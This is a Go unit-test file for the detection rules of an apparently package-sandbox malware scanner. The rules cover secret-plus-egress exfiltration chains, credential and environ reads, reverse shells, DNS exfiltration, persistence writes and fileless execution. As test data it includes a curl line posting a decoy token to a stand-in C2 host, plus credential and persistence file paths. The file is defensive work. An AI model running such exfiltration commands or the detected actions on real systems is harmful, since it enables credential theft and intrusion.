// SPDX-License-Identifier: AGPL-3.0-or-later
package rules

import (
	"testing"

	"detonation/internal/honeytokens"
	"detonation/internal/trace"
)

// install/import exfil are a CHAIN: a network egress convicts as exfil only when a
// secret was touched in the same run (run_sensitive_access, set by the engine).
// A lone external egress emits a low, non-convicting dyn_install_egress note; a
// connect to sandbox infra (private/loopback, e.g. the DNS forwarder) emits nothing.
func extConnect(phase string, sensitive bool) trace.TraceEvent {
	d := map[string]interface{}{"addr": "45.33.32.156", "port": float64(443)}
	if sensitive {
		d["run_sensitive_access"] = true // the engine sets this when a secret was read
	}
	return trace.TraceEvent{Phase: phase, Category: "network", Operation: "connect", Detail: d}
}

func TestExfilChainConvictsOnSecretPlusEgress(t *testing.T) {
	f := installExfil().Evaluate(extConnect("install", true))
	if f == nil || f.RuleID != "dyn_install_exfil" {
		t.Fatalf("secret access + external egress must convict as dyn_install_exfil, got %+v", f)
	}
	if f.Severity != "high" {
		t.Errorf("severity = %q, want high", f.Severity)
	}
}

func TestExfilChainLoneEgressIsLowNote(t *testing.T) {
	f := installExfil().Evaluate(extConnect("install", false))
	if f == nil || f.RuleID != "dyn_install_egress" {
		t.Fatalf("lone external egress must be the low dyn_install_egress note, got %+v", f)
	}
	if f.Severity != "low" {
		t.Errorf("severity = %q, want low (must not convict)", f.Severity)
	}
}

func TestExfilChainIgnoresSandboxInfra(t *testing.T) {
	// 172.17.0.2:53 is the DNS forwarder on the Docker bridge — infra, not egress.
	for _, addr := range []string{"172.17.0.2", "127.0.0.1", "10.0.0.5", "192.168.1.1"} {
		evt := trace.TraceEvent{
			Phase: "install", Category: "network", Operation: "connect",
			Detail: map[string]interface{}{"addr": addr, "port": float64(53),
				"run_sensitive_access": true}, // even WITH a secret read, infra isn't egress
		}
		if f := installExfil().Evaluate(evt); f != nil {
			t.Errorf("connect to sandbox infra %s must not produce a finding, got %+v", addr, f)
		}
	}
}

func TestInstallExfilSkipsImport(t *testing.T) {
	if f := installExfil().Evaluate(extConnect("import", true)); f != nil {
		t.Error("dyn_install_exfil should NOT match import phase")
	}
}

func TestInstallExfilActive(t *testing.T) {
	found := false
	for _, r := range AllRules() {
		if r.ID == "dyn_install_exfil" {
			found = true
		}
	}
	if !found {
		t.Error("dyn_install_exfil must be active in AllRules()")
	}
}

func TestImportExfilChain(t *testing.T) {
	// no secret -> low egress note
	f := importExfil().Evaluate(extConnect("import", false))
	if f == nil || f.RuleID != "dyn_import_egress" || f.Severity != "low" {
		t.Fatalf("lone import egress must be the low dyn_import_egress note, got %+v", f)
	}
	// secret + egress -> convict
	f = importExfil().Evaluate(extConnect("import", true))
	if f == nil || f.RuleID != "dyn_import_exfil" || f.Severity != "high" {
		t.Fatalf("secret + import egress must convict as dyn_import_exfil, got %+v", f)
	}
}

func TestRunSensitiveAccessDetectsSecretReads(t *testing.T) {
	cred := trace.TraceEvent{Category: "file", Operation: "open",
		Detail: map[string]interface{}{"path": "/root/.aws/credentials"}}
	environ := trace.TraceEvent{Category: "file", Operation: "open",
		Detail: map[string]interface{}{"path": "/proc/1234/environ"}}
	benign := trace.TraceEvent{Category: "file", Operation: "open",
		Detail: map[string]interface{}{"path": "/proc/self/environ"}}
	if !RunSensitiveAccess([]trace.TraceEvent{benign, cred}) {
		t.Error("credential read must arm the chain")
	}
	if !RunSensitiveAccess([]trace.TraceEvent{environ}) {
		t.Error("/proc/<pid>/environ read must arm the chain")
	}
	if RunSensitiveAccess([]trace.TraceEvent{benign}) {
		t.Error("/proc/self/environ alone must NOT arm the chain")
	}
}

func TestCredentialRead(t *testing.T) {
	evt := trace.TraceEvent{
		Phase:     "install",
		Category:  "file",
		Operation: "open",
		Detail:    map[string]interface{}{"path": "/root/.ssh/id_rsa"},
	}

	rules := AllRules()
	var matched bool
	for _, r := range rules {
		if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_credential_read" {
			matched = true
		}
	}
	if !matched {
		t.Fatal("expected dyn_credential_read to match")
	}
}

func TestHoneytokenExfilMatchesDecoyValueInArgs(t *testing.T) {
	// a worm shells out to exfil a harvested decoy token in the curl args
	decoy := honeytokens.Canaries()[0].Value
	evt := trace.TraceEvent{
		Phase:     "install",
		Category:  "process",
		Operation: "exec",
		Detail:    map[string]interface{}{"arguments": "curl -s https://evil.example/c2 -d token=" + decoy},
	}
	var matched bool
	for _, r := range AllRules() {
		if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_honeytoken_exfil" {
			matched = true
			if f.Severity != "critical" {
				t.Errorf("severity = %q, want critical", f.Severity)
			}
		}
	}
	if !matched {
		t.Fatal("expected dyn_honeytoken_exfil to match a decoy value in exec args")
	}
}

func TestHoneytokenExfilIgnoresCleanArgs(t *testing.T) {
	evt := trace.TraceEvent{
		Phase:     "install",
		Category:  "process",
		Operation: "exec",
		Detail:    map[string]interface{}{"arguments": "npm install --ignore-scripts"},
	}
	for _, r := range AllRules() {
		if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_honeytoken_exfil" {
			t.Fatal("dyn_honeytoken_exfil must not fire on clean args")
		}
	}
}

func TestScreenCaptureProbeFiresOnToolEnumeration(t *testing.T) {
	for _, args := range []string{"/usr/bin/which scrot", `-c "command -v gnome-screenshot"`, "which xinput"} {
		evt := trace.TraceEvent{
			Phase: "install", Category: "process", Operation: "exec",
			Detail: map[string]interface{}{"arguments": args},
		}
		var matched bool
		for _, r := range AllRules() {
			if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_screen_capture_probe" {
				matched = true
			}
		}
		if !matched {
			t.Errorf("expected dyn_screen_capture_probe to fire on %q", args)
		}
	}
}

func TestScreenCaptureProbeIgnoresClipboardAndNonProbe(t *testing.T) {
	// clipboard tools excluded (legit clipboard libs probe them); and a bare
	// reference without a which/command-v probe must not fire.
	for _, args := range []string{"/usr/bin/which xclip", "node -e import('scrot')", "cp scrot.png /tmp"} {
		evt := trace.TraceEvent{
			Phase: "install", Category: "process", Operation: "exec",
			Detail: map[string]interface{}{"arguments": args},
		}
		for _, r := range AllRules() {
			if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_screen_capture_probe" {
				t.Errorf("dyn_screen_capture_probe must not fire on %q", args)
			}
		}
	}
}

func TestCredentialReadSkipsNormal(t *testing.T) {
	evt := trace.TraceEvent{
		Phase:     "install",
		Category:  "file",
		Operation: "open",
		Detail:    map[string]interface{}{"path": "/usr/lib/python3.11/os.py"},
	}

	rules := AllRules()
	for _, r := range rules {
		if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_credential_read" {
			t.Error("dyn_credential_read should not match normal Python files")
		}
	}
}

func TestReverseShell(t *testing.T) {
	evt := trace.TraceEvent{
		Phase:     "install",
		Category:  "process",
		Operation: "exec",
		Detail:    map[string]interface{}{"binary": "/bin/bash", "has_socket": true},
	}

	rules := AllRules()
	var matched bool
	for _, r := range rules {
		if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_reverse_shell" {
			matched = true
		}
	}
	if !matched {
		t.Fatal("expected dyn_reverse_shell to match")
	}
}

func TestProcInject(t *testing.T) {
	evt := trace.TraceEvent{
		Phase:     "install",
		Category:  "process",
		Operation: "ptrace",
		Detail:    map[string]interface{}{},
	}

	rules := AllRules()
	var matched bool
	for _, r := range rules {
		if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_proc_inject" {
			matched = true
		}
	}
	if !matched {
		t.Fatal("expected dyn_proc_inject to match")
	}
}

func TestDNSExfil(t *testing.T) {
	evt := trace.TraceEvent{
		Phase:     "install",
		Category:  "dns",
		Operation: "query",
		Detail: map[string]interface{}{
			"name":              "a3f8b2c1d4e5f678.evil.tk",
			"subdomain_entropy": float64(4.5),
		},
	}

	rules := AllRules()
	var matched bool
	for _, r := range rules {
		if f := r.Evaluate(evt); f != nil && f.RuleID == "dyn_dns_exfil" {
			matched = true
		}
	}
	if !matched {
		t.Fatal("expected dyn_dns_exfil to match")
	}
}

func TestEnvHarvest(t *testing.T) {
	evt := trace.TraceEvent{
		Phase:     "install",
		Category:  "file",
		Operation: "open",
		Detail:    map[string]interface{}{"path": "/proc/1234/environ"},
	}

	if f := envHarvest().Evaluate(evt); f == nil || f.RuleID != "dyn_env_harvest" {
		t.Fatal("expected dyn_env_harvest to match /proc/<pid>/environ read")
	}
}

func TestEnvHarvestSkipsOrdinaryOpen(t *testing.T) {
	evt := trace.TraceEvent{
		Phase:     "install",
		Category:  "file",
		Operation: "open",
		Detail:    map[string]interface{}{"path": "/app/config.json"},
	}
	if f := envHarvest().Evaluate(evt); f != nil {
		t.Errorf("dyn_env_harvest should not match %v", evt.Detail["path"])
	}
}

func TestSuspiciousWrite(t *testing.T) {
	// Hard-persistence sinks convict on their own (critical).
	hard := []string{"/etc/crontab", "/etc/cron.d/x", "/etc/systemd/system/x.service",
		"/etc/ld.so.preload", "/root/.ssh/authorized_keys"}
	for _, p := range hard {
		evt := trace.TraceEvent{Phase: "install", Category: "file", Operation: "write",
			Detail: map[string]interface{}{"path": p}}
		f := suspiciousWrite().Evaluate(evt)
		if f == nil || f.RuleID != "dyn_suspicious_write" {
			t.Fatalf("%s: expected dyn_suspicious_write", p)
		}
		if f.Severity != "critical" {
			t.Errorf("%s: severity = %q, want critical", p, f.Severity)
		}
	}
	// Shell rc files are dual-use (benign PATH export) → high, so a lone write
	// can't single-handedly flip a package to malicious.
	for _, p := range []string{"/root/.bashrc", "/root/.zshrc", "/root/.profile"} {
		evt := trace.TraceEvent{Phase: "install", Category: "file", Operation: "write",
			Detail: map[string]interface{}{"path": p}}
		f := suspiciousWrite().Evaluate(evt)
		if f == nil {
			t.Fatalf("%s: expected dyn_suspicious_write", p)
		}
		if f.Severity != "high" {
			t.Errorf("%s: severity = %q, want high", p, f.Severity)
		}
	}
}

func TestFilelessExec(t *testing.T) {
	crit := filelessExec().Evaluate(trace.TraceEvent{
		Phase: "import", Category: "process", Operation: "fileless_exec",
	})
	if crit == nil || crit.Severity != "critical" {
		t.Fatalf("expected critical dyn_fileless_exec for execveat, got %v", crit)
	}
	med := filelessExec().Evaluate(trace.TraceEvent{
		Phase: "install", Category: "process", Operation: "memfd_create",
		Detail: map[string]interface{}{"name": "x"},
	})
	if med == nil || med.Severity != "medium" {
		t.Fatalf("expected medium dyn_fileless_exec for memfd_create, got %v", med)
	}
	if f := filelessExec().Evaluate(trace.TraceEvent{Category: "process", Operation: "exec"}); f != nil {
		t.Error("dyn_fileless_exec should not match ordinary exec")
	}
}
